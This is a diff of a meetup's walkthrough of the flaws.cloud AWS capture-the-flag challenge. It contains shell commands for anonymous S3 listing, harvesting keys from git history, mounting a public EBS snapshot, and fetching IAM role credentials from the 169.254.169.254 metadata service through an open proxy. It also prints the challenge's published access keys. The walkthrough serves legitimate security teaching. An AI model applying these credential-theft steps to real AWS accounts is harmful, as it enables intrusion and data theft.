@@ -13,7 +13,9 @@ flaws.cloud AWS challenge
 The challenge
 -------------
 
-This is to document the meetup's efforts responding to the challenge `flaws`_. For other writeups see `mzet-/ctf-writeups - flaws.cloud <https://github.com/mzet-/ctf-writeups/blob/master/flaws.cloud/flaws.cloud.md>`_ (concise and uses ``Scout2``) along with `dboyd13/flaws.cloud.md <https://gist.github.com/dboyd13/ba106b92ad6b795100b766f7c86e532f>`_.
+This is to document the meetup's efforts responding to the challenge `flaws`_, including some AWS background material making the challenge easier to understand.
+
+For other writeups see `mzet-/ctf-writeups - flaws.cloud <https://github.com/mzet-/ctf-writeups/blob/master/flaws.cloud/flaws.cloud.md>`_ (concise and uses ``Scout2``) along with `dboyd13/flaws.cloud.md <https://gist.github.com/dboyd13/ba106b92ad6b795100b766f7c86e532f>`_.
 
 
 The AWS vulnerabilities
@@ -59,7 +61,7 @@ Level 1 AWS background
 
 Note that this only supports s3:GetObject and not the complete list of `AWS IAM - Actions, Resources, and Condition Keys for Amazon S3`_, especially not s3:ListBucket (list bucket contents). But AWS S3 buckets can be misconfigured to allow access from one of the Amazon S3 Predefined Groups in `Amazon S3 - Access Control List (ACL) Overview`_, specifically AllUsers (including anonymous or unauthenticated principals) or AuthenticatedUsers (any user with some AWS account). Note that ACLs are but one way to set permissions: see `IAM Policies and Bucket Policies and ACLs! Oh, My! (Controlling Access to S3 Resources)`_.
 
-AWS uses REST requests (see `Representational state transfer`_). They are authenticated by `Signing AWS API Requests`_ using AWS account access keys consisting of a 20-character access key ID and a 40-character secret access key. (For more detail see `Amazon S3 - Making Requests`_, `AWS S3 - Signing and Authenticating REST Requests`_, `AWS S3 - Authenticating Requests (AWS Signature Version 4)`_, for actual Python code `AWS - Examples of the Complete Version 4 Signing Process (Python)`_.)
+AWS uses REST requests (see `Representational state transfer`_). They are authenticated by `Signing AWS API Requests`_ using AWS account access keys consisting of a 20-character access key ID and a 40-character secret access key. (For more detail see `Amazon S3 - Making Requests`_, `AWS S3 - Signing and Authenticating REST Requests`_, `AWS S3 - Authenticating Requests (AWS Signature Version 4)`_, and for actual Python code `AWS - Examples of the Complete Version 4 Signing Process (Python)`_.)
 
 To make an unauthenticated (unsigned) request (as AllUsers) use ``aws --no-sign-request ...``. To make an authenticated request (as AuthenticatedUsers) use a temporary AWS account and IAM user not tied to any personal account.
 
@@ -86,7 +88,10 @@ Anonymous AWS S3 bucket access
 Test for anonymous (AllUsers) s3:ListBucket access to bucket flaws.cloud:
 
 .. code-block:: bash
-  :emphasize-lines: 6-
+  :emphasize-lines: 1-2,8-
+
+  WORKDIR=$HOME/exploits/flaws
+  rm -rf $WORKDIR && mkdir -p $WORKDIR && cd $WORKDIR
 
   DNS='@8.8.8.8'
   D=flaws.cloud
@@ -111,23 +116,28 @@ Permitting s3:ListBucket allows listing the website's bucket content leading to 
 Level 2 AWS background
 ----------------------
 
-Use an `AWS Free Tier`_ account for stealth (though not necessary for flaws.cloud). Here's the AWS CLI to add/delete an IAM administrative user:
+We're going to pretent you are using an `AWS Free Tier`_ account for stealth (though this is not necessary for flaws.cloud) and will create a hacker IAM account for exploit use. Our goal is to make it easy to only use this IAM account or other compromised credentials (and not your other AWS credentials). We'll do this by setting the environment variables :envvar:`AWS_SHARED_CREDENTIALS_FILE` and :envvar:`AWS_CONFIG_FILE` to a :envvar:`WORKDIR` instead of the default :file:`~/.aws/credentials` and :file:`~/.aws/config`, respectively. That way we can only use an account intended for this exploit, and cleaning up afterward is just deleting those files. See `AWS CLI - Environment Variables`_ and `AWS CLI - Configuration Variables`_ for details.
+
+Here's the AWS CLI to add/delete an IAM administrative user *hacker* for this exploit:
 
 .. code-block:: bash
-  :emphasize-lines: 5,9,12,18,21,29
+  :emphasize-lines: 8,12,15,21,24,37
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
 
   HACKER=hacker
   HACKERGROUP=Administrators
   PASSWORD='PleaseChangeMeS00n!'$RANDOM$RANDOM
 
-  # create user
+  # create additional IAM user in the temp AWS account
   aws iam create-user --user-name $HACKER --output json | tee $HACKER-create.json
   chmod 600 $HACKER-create.json
 
-  # access to the AWS Management Console
+  # access to the AWS Management Console - we don't use this
   aws iam create-login-profile --user $HACKER --password $PASSWORD --no-password-reset-required
 
-  # programmatic access
+  # programmatic access - we only use this
   aws iam create-access-key --user-name $HACKER --output json | tee $HACKER-keys.json
   chmod 600 $HACKER-keys.json
   AK=$(jq -r '.AccessKey.AccessKeyId' $HACKER-keys.json)
@@ -136,11 +146,16 @@ Use an `AWS Free Tier`_ account for stealth (though not necessary for flaws.clou
   # add user to group
   aws iam add-user-to-group --user-name $HACKER --group-name $HACKERGROUP
 
-  # set up profile
+  # set up & switch new profile files - switch profile location for hacking
+  export AWS_CONFIG_FILE=$WORKDIR/.config
+  touch $AWS_CONFIG_FILE && chmod 600 $AWS_CONFIG_FILE
+  export AWS_SHARED_CREDENTIALS_FILE=$WORKDIR/.credentials
+  touch $AWS_SHARED_CREDENTIALS_FILE && chmod 600 $AWS_SHARED_CREDENTIALS_FILE
+
   cat <<EOF | aws configure --profile $HACKER
   $AK
   $SAK
-  $REGION
+  us-west-2
   json
   EOF
 
@@ -152,11 +167,23 @@ Use an `AWS Free Tier`_ account for stealth (though not necessary for flaws.clou
 The corresponding code to delete the user is:
 
 .. code-block:: bash
-  :emphasize-lines: 2,5-
+  :emphasize-lines: 2,5,8,11,15
 
-  # *********************
-  # when done delete user
-  # *********************
+  # *********************************************************
+  # When done delete user.
+  # NOTE - this assumes you use the default profile location.
+  # *********************************************************
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
+
+  # Delete all SSH keypairs
+  rm -f $WORKDIR/*.pem
+
+  # Delete config, credential files
+  rm -f $AWS_SHARED_CREDENTIALS_FILE $AWS_CONFIG_FILE
+  unset AWS_SHARED_CREDENTIALS_FILE AWS_CONFIG_FILE
+
+  # Delete IAM user
   HACKER=hacker
   aws iam delete-login-profile --user-name $HACKER
   GS=$(aws iam list-groups-for-user --user-name $HACKER --output text \
@@ -178,7 +205,10 @@ AllUsers bucket access fails
 Accessing the Level 2 bucket *level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud* without signing fails:
 
 .. code-block:: bash
-  :emphasize-lines: 5-
+  :emphasize-lines: 8-
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
 
   DNS='@8.8.8.8'
   D=level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
@@ -195,7 +225,12 @@ AuthenticatedUsers bucket access succeeds
 From `Amazon S3 - Access Control List (ACL) Overview`_ *Amazon S3 Predefined Groups*, permissions are not set using the AllUsers group. But perhaps it uses the AuthenticatedUsers group (any principal with an AWS account). To check out create a throw-away user (following the code above) then:
 
 .. code-block:: bash
-  :emphasize-lines: 7-
+  :emphasize-lines: 12-
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
+  export AWS_CONFIG_FILE=$WORKDIR/.config
+  export AWS_SHARED_CREDENTIALS_FILE=$WORKDIR/.credentials
 
   HACKER=hacker
   DNS='@8.8.8.8'
@@ -235,7 +270,7 @@ Use `AWS Security Audit Guidelines`_ to assess recently compromised credentials.
 
 * `AWS Scout2 <https://github.com/nccgroup/Scout2>`_
 
-  Scout2 is a security tool that lets AWS administrators assess their environment's security posture. It produces an html report.  Needed permissions are AWS Managed Policies ReadOnlyAccess and SecurityAudit, though interesting results are possible without those permissions. See `AWS Scout2 Wiki <https://github.com/nccgroup/Scout2/wiki>`_ for more information.
+  ``Scout2`` is a security tool that lets AWS administrators assess their environment's security posture. It produces an html report.  Needed permissions are AWS Managed Policies ReadOnlyAccess and SecurityAudit, though interesting results are possible without those permissions. See `AWS Scout2 Wiki <https://github.com/nccgroup/Scout2/wiki>`_ for more information.
 
 
 AWS STS
@@ -258,7 +293,11 @@ AllUsers bucket access
 Access the level 3 bucket as AllUsers:
 
 .. code-block:: bash
-  :emphasize-lines: 8-9,13
+  :emphasize-lines: 11-12,16
+
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
 
   LEVEL3=level3
   DNS='@8.8.8.8'
@@ -281,7 +320,17 @@ Analyze the git repo
 Git repositories have been a historical source of leaked credentials:
 
 .. code-block:: bash
-  :emphasize-lines: 3-5,6-12,18,23,26-27,29-
+  :emphasize-lines: 13-15,17-22,28,33,36-37,39-
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
+  export AWS_CONFIG_FILE=$WORKDIR/.config
+  export AWS_SHARED_CREDENTIALS_FILE=$WORKDIR/.credentials
+
+  DNS='@8.8.8.8'
+  D=level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+  REGION=$(dig $DNS +short -x $(dig $DNS +short $D) \
+    | sed 's/^.*website.//;s/.amazonaws.com\.$//')
 
   LEVEL3=level3
   cd $LEVEL3-repo
@@ -322,7 +371,10 @@ Git repositories have been a historical source of leaked credentials:
 Use Truffle Hog for an alternative approach to finding the Git credentials:
 
 .. code-block:: bash
-  :emphasize-lines: 4,19,21
+  :emphasize-lines: 7,22,24
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
 
   LEVEL3=level3
 
@@ -358,7 +410,12 @@ Audit the compromised keys
 The goal is to collect information from `AWS Security Audit Guidelines`_ with user *backup*. Here use ``Scout2``:
 
 .. code-block:: bash
-  :emphasize-lines: 8,10-11,14-16,22-24,25,27,30
+  :emphasize-lines: 13,19,25-26,29-31,36-39,40,42,45
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
+  export AWS_CONFIG_FILE=$WORKDIR/.config
+  export AWS_SHARED_CREDENTIALS_FILE=$WORKDIR/.credentials
 
   LEVEL3=level3
   DNS='@8.8.8.8'
@@ -367,7 +424,17 @@ The goal is to collect information from `AWS Security Audit Guidelines`_ with us
     | sed 's/^.*website.//;s/.amazonaws.com\.$//')
 
   pip install -U awsscout2
+  # Scout2 ignores AWS_CONFIG_FILE and AWS_SHARED_CREDENTIALS_FILE
+  (
+    cd ~/.aws && \
+    mv config config.bak && cp $AWS_CONFIG_FILE config && \
+    mv credentials credentials.bak && cp $AWS_SHARED_CREDENTIALS_FILE credentials
+  )
   Scout2 --profile $LEVEL3 --region $REGION --report-dir scout2-$LEVEL3
+  (
+     cd ~/.aws && \
+     mv config.bak config && mv credentials.bak credentials
+  )
   # Directory scout2-$LEVEL3 contains HTML report:
   (cd scout2-$LEVEL3; python3 -m http.server 8080)
   # Browse report ...
@@ -432,10 +499,15 @@ Our goal is "to get access to the web page running on an EC2 at 4d0cf09b9b2d761a
 Exploit public snapshot
 -----------------------
 
-Level 3 left us with *backup*'s credentials and reconnaisance results from ``Scout2``. Prominent among those results is there is 1 EC2 instance with 1 snapshot of it's disk volume. One way to exploit the snapshot is: restore the snapshot to a volume, mount the volume on an EC2 instance, then explore the volume for exploit potentials. Level 3 credentials are required to recon that snapshot, your hacker account creates the EC2 instance using the public snapshot.
+Level 3 left us with *backup*'s credentials and reconnaisance results from ``Scout2``. Prominent among those results is there is 1 EC2 instance with 1 snapshot of it's disk volume. One way to exploit the snapshot is: restore the snapshot to a volume, mount the volume on an EC2 instance, then explore the volume for exploit potentials. Note the careful use of credentials: Level 3 credentials are required to recon that snapshot, while your hacker account creates the EC2 instance using the public snapshot.
 
 .. code-block:: bash
-  :emphasize-lines: 11-13,31-35,37-38,47,54,63,73,80,88,92,95-
+  :emphasize-lines: 16-18,36-40,42-43,52,59,68,78,85,93,97,100-
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
+  export AWS_CONFIG_FILE=$WORKDIR/.config
+  export AWS_SHARED_CREDENTIALS_FILE=$WORKDIR/.credentials
 
   LEVEL3=level3
   LEVEL4=level4
@@ -546,7 +618,12 @@ On the website http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/ ente
 To clean up the created EC2 resources:
 
 .. code-block:: bash
-  :emphasize-lines: 9-
+  :emphasize-lines: 12-
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
+  export AWS_CONFIG_FILE=$WORKDIR/.config
+  export AWS_SHARED_CREDENTIALS_FILE=$WORKDIR/.credentials
 
   DNS='@8.8.8.8'
   D=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
@@ -554,7 +631,6 @@ To clean up the created EC2 resources:
   HACKER=hacker
   LEVEL4=level4
   SG=$LEVEL4-sg
-  KEYNAME=$LEVEL4-key
   VMNAME=$LEVEL4
   INSTANCE=$(aws --profile $HACKER --region $REGION ec2 describe-instances \
                  --filters "Name=tag:Name,Values=$VMNAME" \
@@ -563,9 +639,6 @@ To clean up the created EC2 resources:
   )
   aws --profile $HACKER --region $REGION \
     ec2 terminate-instances --instance-ids $INSTANCE
-  aws --profile $HACKER --region $REGION \
-    ec2 delete-key-pair --key-name $KEYNAME
-  rm $KEYNAME.pem
   aws --profile $HACKER --region $REGION \
     ec2 delete-security-group --group-name $SG
 
@@ -577,40 +650,20 @@ To clean up the created EC2 resources:
 Level 5 AWS background
 ----------------------
 
-This exploit hinges on using `AWS EC2 - Instance Metadata and User Data`_. Specifically, if a host allows access to http://169.254.169.254 then critical security information can be leaked. For retrieving and using credentials see `AWS EC2 - Retrieving Security Credentials from Instance Metadata`_, `AWS IAM - Using Temporary Security Credentials with the AWS CLI`_, and `AWS CLI - Configuring the AWS CLI`_. Here's an example:
+This exploit hinges on using `AWS EC2 - Instance Metadata and User Data`_. Specifically, `AWS IAM - Using an IAM Role to Grant Permissions to Applications Running on Amazon EC2 Instances`_ following `AWS EC2 - Retrieving Security Credentials from Instance Metadata`_ to retrieve security credentials for an IAM role (here named s3access):
 
 .. code-block:: bash
-  :emphasize-lines: 3-4,9,17,28
+  :emphasize-lines: 1
 
-  # Get the creds
-  ROLE=some-role
-  curl --silent http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE/ \
-    | tee creds.json
-  AK=$(jq -r '.AccessKeyId' creds.json)
-  SAK=$(jq -r '.SecretAccessKey' creds.json)
-  TOKEN=$(jq -r '.Token' creds.json)
+  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
 
-  # Use the creds
-  (
-  export AWS_ACCESS_KEY_ID="$AK"
-  export AWS_SECRET_ACCESS_KEY="$SAK"
-  export AWS_SESSION_TOKEN="$TOKEN"
-  aws --region us-west-2 ec2 describe-instances
-  )
+By design, applications running on an EC2 instance retrieve their credentials from the local instance metadata availalble via http://169.254.169.254/. That same article warns:
 
-  # Create a profile
-  HACKER=myprofile
-  REGION=us-west-2
-  cat <<EOF | aws configure --profile $HACKER
-  $AK
-  $SAK
-  $REGION
-  json
-  EOF
-  aws --profile $HACKER configure set aws_session_token "$TOKEN"
+  **Warning**
 
-  # Use the profile
-  aws --profile $HACKER --region $REGION ec2 describe-instances
+  If you use services that use instance metadata with IAM roles, ensure that you don't expose your credentials when the services make HTTP calls on your behalf. The types of services that could expose your credentials include HTTP proxies, HTML/CSS validator services, and XML processors that support XML inclusion.
+
+And Level 5 provides an HTTP proxy allowing access to http://169.254.169.254/ and therefore access to role credentials. For more information see `AWS IAM - Using Temporary Security Credentials with the AWS CLI`_ and `AWS CLI - Configuring the AWS CLI`_. Note that a token is required in addition to the usual access key and secret access key.
 
 
 Exploit the proxy to get meta-data
@@ -619,7 +672,12 @@ Exploit the proxy to get meta-data
 The proxy not restricting IPs allows fetching instance metadata, leading to a credentials leak, resulting in the goal of listing the contents of the level 6 bucket.
 
 .. code-block:: bash
-  :emphasize-lines: 6,14,26-28,30-
+  :emphasize-lines: 11,19,31-33,35-
+
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
+  export AWS_CONFIG_FILE=$WORKDIR/.config
+  export AWS_SHARED_CREDENTIALS_FILE=$WORKDIR/.credentials
 
   LEVEL5=level5
   DNS='@8.8.8.8'
@@ -701,8 +759,12 @@ Exploit SecurityAudit policy
 Level 6 provides *Access key ID: AKIAJFQ6E7BY57Q3OBGA* and *Secret: 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* with the SecurityAudit policy.
 
 .. code-block:: bash
-  :emphasize-lines: 8,18-21,23,31,35,42,46,52,54,57,60,62-64,72-
+  :emphasize-lines: 13,23,29-30,35-36,38,46,50,57,61,67,69,72,75,77-79,87-
 
+  WORKDIR=$HOME/exploits/flaws
+  cd $WORKDIR
+  export AWS_CONFIG_FILE=$WORKDIR/.config
+  export AWS_SHARED_CREDENTIALS_FILE=$WORKDIR/.credentials
 
   LEVEL6=level6
   DNS='@8.8.8.8'
@@ -720,9 +782,19 @@ Level 6 provides *Access key ID: AKIAJFQ6E7BY57Q3OBGA* and *Secret: S2IpymMBlViD
   $REGION
   json
   EOF
- 
-  # Scout2 for reconnaissance
+
+  # Scout2 ignores AWS_CONFIG_FILE and AWS_SHARED_CREDENTIALS_FILE
+  (
+    cd ~/.aws && \
+    mv config config.bak && cp $AWS_CONFIG_FILE config && \
+    mv credentials credentials.bak && cp $AWS_SHARED_CREDENTIALS_FILE credentials
+  )
+  # Scount2 for reconnaissance
   Scout2 --profile $LEVEL6 --region $REGION --report-dir scout2-$LEVEL6
+  (
+     cd ~/.aws && \
+     mv config.bak config && mv credentials.bak credentials
+  )
   (cd scout2-$LEVEL6; python3 -m http.server 8080)
   # Browse report ...
 
@@ -785,4 +857,4 @@ And visiting http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b
 Cleaning Up
 ===========
 
-Follow the instructions above to :ref:`delete the EC2 instance <flaws-delete-instance>`, followed by :ref:`delete the $HACKER user & SSH keys <flaws-delete-user>`, then manually clean up the added profiles in :file:`~/.aws/config` and :file:`~/.aws/credentials`.
+Follow the instructions above to :ref:`delete the EC2 instance <flaws-delete-instance>`, followed by :ref:`delete the $HACKER user, SSH keys, and AWS profiles <flaws-delete-user>`.
